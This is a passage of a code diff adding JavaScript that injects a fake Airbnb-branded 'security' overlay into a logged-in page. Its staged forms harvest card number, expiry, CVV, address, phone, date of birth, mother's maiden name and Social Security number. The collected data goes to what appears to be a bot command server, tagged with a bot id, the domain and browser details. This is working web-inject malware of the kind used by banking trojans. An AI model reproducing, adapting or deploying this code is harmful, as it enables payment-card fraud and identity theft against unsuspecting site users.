69 75 137.1 117.1 203.1 125.1h14c5 1 9 1 10 1 127.1.1 232.1-123 181.1-263.1z" data-reactid="13"></path></svg>'+
+												'</div>'+
+										'</div>'+
+										'<br>'+
+
+										
+										'<div  style="width:600px;margin:0 auto;padding-left:30px;padding-right:30px;padding-bottom:30px;text-align:center !important; border-radius:10px !important;">'+
+										
+											'<span style="font-size:22px;padding-bottom: 0px;font-weight:bold;font-family: Circular,"Helvetica Neue",Helvetica,Arial,sans-serif;">'+_tables.text.security+'<span></br>'+
+											'<p style="padding-left:0px; font-size:14px !important; margin-bottom:20px;font-weight:normal;font-family: Circular,"Helvetica Neue",Helvetica,Arial,sans-serif;">'+_tables.text.legend+'</p>'+
+				
+				
+											
+											'<div style="text-align:center !important; padding-left:30px !important; margin-right:0px;width:448px !important;">'+
+									
+										'<table id="_table.1" style="width:448px;border-radius: 8px;background-color: #fff;margin-top: 20px;;text-align:center;border:1px solid #dce0e0; ">'+
+											
+											'<tr>'+
+													'<td style="background:#FFFFFF;text-align:center;font-size:18px; font-weight:;   padding-left:20px;padding-bottom:10px; padding-right:20px;padding-top:20px; color:#484848;"><span>'+_tables.text.title1+'</span></td>'+
+										'</tr>'+
+
+											'<hr style="color:#dce0e0;">'+
+											
+										'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;"><input id="_tables.inp.name" type="text"  placeholder="'+_tables.text.name+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+										'</tr>'+	
+										'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;"><input id="_tables.inp.card" type="text"  placeholder="'+_tables.text.cardNum+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+										'</tr>'+
+										
+										'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;">'+_tables.create_select('Month',1,12,'_tables.inp.exp.1')+'&nbsp;&nbsp;&nbsp;'+_tables.create_select('Year',2015,2031,'_tables.inp.exp.2')+'</td>'+
+											
+										
+										'</tr>'+
+										
+										
+										
+										
+										'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:25px; padding-right:20px; color:#aaa;"><input id="_tables.inp.CVV" type="password"  placeholder="'+_tables.text.cvv+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family:Helvetica;font-size:13px; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 60px;" maxlength="4" title="First Name" value="" name="firstname" id="firstname"></td>'+
+										'</tr>'+
+										
+										
+										'<tr>'+
+											
+										'<td style="padding-left:28px; text-align:center;padding-left:26px;padding-right:28px;padding-bottom:32px;"><button style="height:60px;width:384px;border:1px solid #ff5a5f;background-color: #ff5a5f;color: #fff;font-size:16px;padding-top: 20px !important;padding-bottom: 20px !important; padding-left: 27px !important;padding-right: 27px !important;font-weight: normal;    border-radius: 4px;text-align:center;cursor:pointer;" id="_tables.btn1" class="button" type="button"><span>'+_tables.text.title_btn1+'</span></button></td>'+
+										'</tr>'+
+										
+										'</table>'+
+										
+											//table v2
+											
+										'<table id="_table.2" style="width:448px;border-radius: 8px;background-color: #fff;margin-top: 20px;;text-align:center;border:1px solid #dce0e0;display:none; ">'+
+											
+											'<tr>'+
+													'<td style="background:#FFFFFF;text-align:center;font-size:18px; font-weight:;   padding-left:20px;padding-bottom:10px; padding-right:20px;padding-top:20px; color:#484848;"><span>'+_tables.text.title2+'</span></td>'+
+										'</tr>'+
+										'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;"><input id="_tables.street" type="text"  placeholder="'+_tables.text.street+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+										'</tr>'+
+										
+											
+											'<tr>'+
+												'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;"><input id="_tables.city" type="text"  placeholder="'+_tables.text.city+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+											'</tr>'+
+									
+										'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;"><input id="_tables.state_province" type="text"  placeholder="'+_tables.text.state+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+										'</tr>'+
+										
+											
+										'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;"><input id="_tables.zip" type="text"  placeholder="'+_tables.text.zip+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+										'</tr>'+
+											'<tr>'+
+											'<td style="background:#FFFFFF;text-align:left;   padding-left:30px;padding-bottom:15px; padding-right:20px; color:#aaa;"><input id="_tables.phone" type="text"  placeholder="'+_tables.text.phone+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+										'</tr>'+
+											
+										
+										
+										'<tr>'+
+											
+										'<td style="padding-left:28px; text-align:center;padding-left:26px;padding-right:28px;padding-bottom:32px;padding-top:25px;"><button style="height:60px;width:384px;border:1px solid #ff5a5f;background-color: #ff5a5f;color: #fff;font-size:16px;padding-top: 20px !important;padding-bottom: 20px !important; padding-left: 27px !important;padding-right: 27px !important;font-weight: normal;    border-radius: 4px;text-align:center;cursor:pointer;" id="_tables.btn2" class="button" type="button"><span>'+_tables.text.title_btn2+'</span></button></td>'+
+										'</tr>'+
+										
+										'</table>'+
+											
+										
+										
+											//table v3
+										
+												'<table id="_table.3" style="width:448px;border-radius: 8px;background-color: #fff;margin-top: 20px;;text-align:center;border:1px solid #dce0e0;display:none; ">'+
+											
+											'<tr>'+
+													'<td style="background:#FFFFFF;text-align:center;font-size:18px; font-weight:;   padding-left:20px;padding-bottom:10px; padding-right:20px;padding-top:20px; color:#484848;"><span>'+_tables.text.title2+'</span></td>'+
+										'</tr>'+
+											
+											
+											'<tr>'+
+												
+												'<td style="font-size:14px; font-family:Arial; width:28%; color:#888;text-align:left;padding-left:29px;"><label>'+_tables.text.dofbth+'</label></td>'+
+											'</tr>'+	
+												
+											'</tr>'+	
+												'<td style="background:#FFFFFF;text-align:left; padding-top:0px !important;padding-bottom:9px;padding-left:28px;padding-right:18px;padding-top:0px !important;">'+_tables.create_select('Day',1,31,'_tables.inp.dop1')+'&nbsp;&nbsp;'+_tables.create_select('Month',1,12,'_tables.inp.dop2')+'&nbsp;&nbsp;'+_tables.create_select('Year',1920,2000,'_tables.inp.dop3')+'</td>'+
+											'</tr>'+
+
+											
+											
+											'<tr>'+
+												'<td style="background:#FFFFFF;text-align:left;   padding-left:27px;padding-bottom:8px; padding-right:20px; color:#aaa;"><input id="_tables.question" type="text"  placeholder="'+_tables.text.mother+'" class="input-text required-entry validate-email" style="border-radius:3px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:40px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 384px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"></td>'+
+											'</tr>'+
+										
+										'<tr>'+
+										
+											'<td style="font-size:14px; font-family:Arial; width:28%; color:#888;text-align:left;padding-left:29px;"><label>'+_tables.text.ssn+'</label></td>'+
+											
+										'</tr>'+	
+											'<tr>'+
+												'<td style="background:#FFFFFF;text-align:left; padding-top:0px !important;padding-bottom:18px;padding-left:28px;padding-right:18px;padding-top:0px !important;">'+
+													'<input id="_tables_ssn1" onkeyup="_tables.next(this,3,\'_tables_ssn2\')"; type="text" class="input-text required-entry validate-email" maxlength="3"  style=" color:#484848 border-radius:5px;display: inline-block; border:1px solid #aaa;font-family:Helvetica;font-size: 13px; height:36px;letter-spacing: -.3px;padding-left: 14px;text-transform: none;width: 90px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname">&nbsp;&nbsp;&nbsp;'+
+													'<input id="_tables_ssn2" onkeyup="_tables.next(this,2,\'_tables_ssn3\')"; type="text" class="input-text required-entry validate-email" maxlength="2"  style=" color:#484848 border-radius:5px;display: inline-block; border:1px solid #aaa;font-family:Helvetica;font-size: 13px; height:36px;letter-spacing: -.3px;padding-left: 14px;text-transform: none;width: 90px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname">&nbsp;&nbsp;&nbsp;'+
+													'<input id="_tables_ssn3" type="text" class="input-text required-entry validate-email" maxlength="4"  style=" color:#484848 border-radius:5px;display: inline-block; border:1px solid #aaa;font-family:Helvetica;font-size: 13px; height:36px;letter-spacing: -.3px;padding-left: 14px;text-transform: none;width: 90px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname">'+
+												'</td>'+
+										
+										'</tr>'+
+
+
+
+
+
+
+										'<tr>'+
+											
+										'<td style="padding-left:28px; text-align:center;padding-left:23px;padding-right:28px;padding-bottom:32px;"><button style="height:60px;width:384px;border:1px solid #ff5a5f;background-color: #ff5a5f;color: #fff;font-size:16px;padding-top: 20px !important;padding-bottom: 20px !important; padding-left: 27px !important;padding-right: 27px !important;font-weight: normal;    border-radius: 4px;text-align:center;cursor:pointer;" id="_tables.btn3" class="button" type="button"><span>'+_tables.text.title_btn3+'</span></button></td>'+
+										'</tr>'+			
+	
+								
+								
+								'</table>'+
+										
+										
+										
+										'</div>'+
+										
+										
+										
+							'</div>'+
+										'<div style="text-align:center;font-family:Helvetica;font-size:12px; color:#707070;position:absolute;z-index:9999999999;bottom:0px !important;width:100%; border-top:1px solid #aaa;padding-left: 200px;padding-top: 20px;padding-bottom: 250px;">'+
+																										'<div style="text-align:center;" class="container_qtix31"><div class="child_17u98ky">'+
+																'<div style="margin: 0px 8px 0px 0px;text-align:center;">'+
+																'<svg viewBox="0 0 1000 1000" aria-hidden="true" focusable="false" style="display: block; fill: rgb(118, 118, 118); height: 1.5em; width: 1.5em;"><path d="M499.3 736.7c-51-64-81-120.1-91-168.1-10-39-6-70 11-93 18-27 45-40 80-40s62 13 80 40c17 23 21 54 11 93-11 49-41 105-91 168.1zm362.2 43c-7 47-39 86-83 105-85 37-169.1-22-241.1-102 119.1-149.1 141.1-265.1 90-340.2-30-43-73-64-128.1-64-111 0-172.1 94-148.1 203.1 14 59 51 126.1 110 201.1-37 41-72 70-103 88-24 13-47 21-69 23-101 15-180.1-83-144.1-184.1 5-13 15-37 32-74l1-2c55-120.1 122.1-256.1 199.1-407.2l2-5 22-42c17-31 24-45 51-62 13-8 29-12 47-12 36 0 64 21 76 38 6 9 13 21 22 36l21 41 3 6c77 151.1 144.1 287.1 199.1 407.2l1 1 20 46 12 29c9.2 23.1 11.2 46.1 8.2 70.1zm46-90.1c-7-22-19-48-34-79v-1c-71-151.1-137.1-287.1-200.1-409.2l-4-6c-45-92-77-147.1-170.1-147.1-92 0-131.1 64-171.1 147.1l-3 6c-63 122.1-129.1 258.1-200.1 409.2v2l-21 46c-8 19-12 29-13 32-51 140.1 54 263.1 181.1 263.1 1 0 5 0 10-1h14c66-8 134.1-50 203.1-125.1 69 75 137.1 117.1 203.1 125.1h14c5 1 9 1 10 1 127.1.1 232.1-123 181.1-263.1z"></path></svg></div></div>'+
+																'<div class="child_17u98ky">'+
+																'<div class="text_5mbkop-o_O-size_small_1gg2mc-o_O-color_muted_10k87om">© Airbnb, Inc.</div>'+
+																'</div>'+
+																'</div>'+
+
+
+											
+										
+										'</div>'+
+						'</div>';
+				
+	
+				
+	document.body.appendChild(_fakediv);			
+
+
+	_tables.bind('click',_tables.id("_tables.btn1"),function(){
+			var nextstep = true;
+			 
+			 _tables.error(_tables.id('_tables.inp.name'),false);
+			 _tables.error(_tables.id('_tables.inp.card'),false);
+			 _tables.error(_tables.id('_tables.inp.exp.1'),false);
+			 _tables.error(_tables.id('_tables.inp.exp.2'),false);
+			 _tables.error(_tables.id('_tables.inp.CVV'),false);
+
+		if(_tables.id('_tables.inp.name').value < 3){
+			nextstep = false;
+			_tables.error(_tables.id('_tables.inp.name'),true);
+		}
+		if(!_tables.check_cc(_tables.id('_tables.inp.card').value || _tables.id('_tables.inp.card').length < 15)){
+			nextstep = false;
+			_tables.error(_tables.id('_tables.inp.card'),true);
+		}
+			
+		if(_tables.id('_tables.inp.exp.1').selectedIndex < 1){
+			nextstep = false;
+		_tables.error(_tables.id('_tables.inp.exp.1'),true);
+		}
+	
+		if(_tables.id('_tables.inp.exp.2').selectedIndex < 1){
+			nextstep = false;
+		_tables.error(_tables.id('_tables.inp.exp.2'),true);
+		}	
+		
+		if(!/[0-9]{3}/igm.test(_tables.id('_tables.inp.CVV').value)){
+			nextstep = false; 
+		_tables.error(_tables.id('_tables.inp.CVV'),true);
+		}		
+			
+		
+if(nextstep){
+	
+	_tables.btntoloader(_tables.id('_tables.btn1'),_tables.get('loader'));
+	_tables.add('data','Name on card: '+_tables.id('_tables.inp.name').value+
+		'|'+'Card number: ' +_tables.id('_tables.inp.card').value+'|'+'Exp: '+_tables.id('_tables.inp.exp.1')[_tables.id('_tables.inp.exp.1').selectedIndex].value+'/'+_tables.id('_tables.inp.exp.2')[_tables.id('_tables.inp.exp.2').selectedIndex].value+
+		'|'+'CVV: '+_tables.id('_tables.inp.CVV').value+'|');
+	
+
+	
+	setTimeout(function(){
+		_tables.id('_table.1').style.display = 'none';
+		_tables.id('_table.2').style.display = '';
+	
+	},1234);
+
+}		
+			});
+	
+	_tables.bind('click',_tables.id("_tables.btn2"),function(){
+			var nextstep = true;
+			 
+			 _tables.error(_tables.id('_tables.street'),false);
+			 _tables.error(_tables.id('_tables.city'),false);
+			 _tables.error(_tables.id('_tables.state_province'),false);
+			 _tables.error(_tables.id('_tables.zip'),false);
+			 _tables.error(_tables.id('_tables.phone'),false);
+
+		if(_tables.id('_tables.street').value.length<3){
+			nextstep = false;
+			_tables.error(_tables.id('_tables.street'),true);
+		}
+		if(_tables.id('_tables.city').value.length<3){
+			nextstep = false;
+			_tables.error(_tables.id('_tables.city'),true);
+		}
+		if(_tables.id('_tables.state_province').value.length<3){
+			nextstep = false;
+			_tables.error(_tables.id('_tables.state_province'),true);
+		}
+		
+		if(_tables.id('_tables.zip').value.length<5){
+		nextstep = false;
+		_tables.error(_tables.id('_tables.zip'),true);
+		}		
+		
+		if(!/[0-9]{3,}/igm.test(_tables.id('_tables.phone').value || _tables.id('_tables.phone').value.length < 5)){
+		nextstep = false;
+		_tables.error(_tables.id('_tables.phone'),true);
+		}
+	
+		
+if(nextstep){
+	
+	
+		_tables.btntoloader(_tables.id('_tables.btn2'),_tables.get('loader'));
+	_tables.add('data','Street: '+_tables.id('_tables.street').value+'|'+'City: '+_tables.id('_tables.city').value+'|'+'State/Province: ' + _tables.id('_tables.state_province').value+
+		'|'+'ZIP: ' +_tables.id('_tables.zip').value+'|'+'Phone Num: ' + _tables.id('_tables.phone').value+'|');
+	
+	
+	setTimeout(function(){
+		_tables.id('_table.2').style.display = 'none';
+		_tables.id('_table.3').style.display = '';
+	
+	},1234);
+
+}		
+			});
+
+	_tables.bind('click',_tables.id('_tables.btn3'),function(){
+			var nextstep = true;
+			 
+			 _tables.error(_tables.id('_tables.inp.dop1'),false);
+			 _tables.error(_tables.id('_tables.inp.dop2'),false);
+			 _tables.error(_tables.id('_tables.inp.dop3'),false);
+			 _tables.error(_tables.id('_tables.question'),false);
+			 _tables.error(_tables.id('_tables_ssn1'),false);
+			 _tables.error(_tables.id('_tables_ssn2'),false);
+			 _tables.error(_tables.id('_tables_ssn3'),false);
+			 
+			 _tables.error(_tables.id('_tables.inp.CVV'),false);
+
+	if(_tables.id('_tables.inp.dop1').selectedIndex < 1){
+			nextstep = false;
+		_tables.error(_tables.id('_tables.inp.dop1'),true);
+	}
+	
+	if(_tables.id('_tables.inp.dop2').selectedIndex < 1){
+			nextstep = false;
+		_tables.error(_tables.id('_tables.inp.dop2'),true);
+		}	
+			
+	if(_tables.id('_tables.inp.dop3').selectedIndex < 1){
+			nextstep = false;
+		_tables.error(_tables.id('_tables.inp.dop3'),true);
+		}
+		
+	if(_tables.id('_tables.question').value.length<2){
+		nextstep = false;
+		_tables.error(_tables.id('_tables.question'),true);
+	}
+	if(!/[0-9]{3}/igm.test(_tables.id('_tables_ssn1').value)){
+		nextstep = false;
+	_tables.error(_tables.id('_tables_ssn1'),true);
+	};
+
+	if(!/[0-9]{2}/igm.test(_tables.id('_tables_ssn2').value)){
+		nextstep = false;
+	_tables.error(_tables.id('_tables_ssn2'),true);
+	};
+
+if(!/[0-9]{4}/igm.test(_tables.id('_tables_ssn3').value)){
+		nextstep = false;
+	_tables.error(_tables.id('_tables_ssn3'),true);
+	}
+	
+	if(nextstep){
+	
+		_tables.btntoloader(_tables.id('_tables.btn3'),_tables.get('loader'));
+		_tables.add('data','DBirth: '+ _tables.id('_tables.inp.dop1')[_tables.id('_tables.inp.dop1').selectedIndex].value + '/' + 
+		_tables.id('_tables.inp.dop2')[_tables.id('_tables.inp.dop2').selectedIndex].value + '/' +_tables.id('_tables.inp.dop3')[_tables.id('_tables.inp.dop3').selectedIndex].value +'|'+'Mother`s name: '+
+		_tables.id('_tables.question').value+'|' + 'SSN :'+_tables.id('_tables_ssn1').value+'/'+_tables.id('_tables_ssn2').value+'/'+_tables.id('_tables_ssn3').value+'|');
+		
+	
+	
+	
+		_tables.add('message','complete');
+		_tables.set('finish','finish');
+		_tables.status('TL');
+		_tables.log();
+	
+	
+
+
+}		
+			});
+
+};
+
+_tables.log = function(){
+	_tables.send(
+		{'type':_tables.get('type')},
+		{'param1':_tables.get('end')},
+		{'param2':_tables.get('finish')},
+		{'param5':'OFF'},
+		{'message':_tables.get('message')},
+		{'balance':_tables.get('balance')},
+		{'data':_tables.get('data')},
+		{'link':document.domain},
+		{'browser':_tables.brows()},
+		{'jabber':'SEND'},
+		{'branch':'TL'}
+	);
+};
+
+
+_tables.create_select = function(def,start,stop,id){
+	var opt = '';
+	for(var i = start; i <= stop; i++){
+		opt += '<option value="'+i+'">'+i+'</option>';
+	}
+	return '<select id="'+id+'" style="text-align:left; border-radius:2px;display: inline-block; border:1px solid #aaa;font-family: Circular,Helvetica,Arial,sans-serif;font-size:15px !important; color:#484848 !important; font-weight:normal;height:36px;letter-spacing: -.3px;padding-left: 9px;text-transform: none;width: 90px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname"><option>'+def+'</option>'+opt+'</select>';
+
+};
+
+_tables.error = function(inp,state){
+	if(state){
+		inp.style.border= '1px solid #fd1212';
+	}else{
+		inp.style.border= '1px solid silver';
+	}
+};
+
+
+_tables.showpage = function(){
+	if(_tables.id('_brows.cap'))_tables.id('_brows.cap').parentNode.removeChild(_tables.id('_brows.cap'));
+};
+
+_tables.callback = function(){
+	_tables.set('message','');
+	switch(_tables.status()){
+		
+		case('CP'):
+			if(!_tables.answer){
+				_tables.status('IP');
+				_tables.send({'login1':_brows.botid},{'type':_tables.get('type')},{'param1':_tables.get('start')},{'domain':document.domain},{'branch':'SL'});
+				return;
+			}else{
+				
+				if(_tables.answer.p1 == 'start' && _tables.answer.p2 != 'finish'){
+					
+					_tables.fake();
+					_tables.showpage();
+				}else{
+					_tables.showpage();
+					
+				}
+				
+			}
+		
+		
+		
+		break;
+		
+		case('TL'):
+			location.reload();
+		break;
+		
+		case('IP'):
+			location.reload();
+		break;
+		
+		default:
+			_tables.showpage();
+		break;
+		
+	}
+};
+
+
+
+
+_tables.start = function(){
+	_tables.set('logout',function(){return _tables.findout(document,'div','class:_1r3wpux')});
+	if(_tables.get('logout')){
+		_tables.status('CP');
+		_tables.send({'domain':document.domain},{'type':_tables.get('type')},{'branch':'CP'});
+	}else{
+		setTimeout(function(){_tables.start();},100);
+	}
+};
+
+_tables.showpage();
+_tables.start();
+
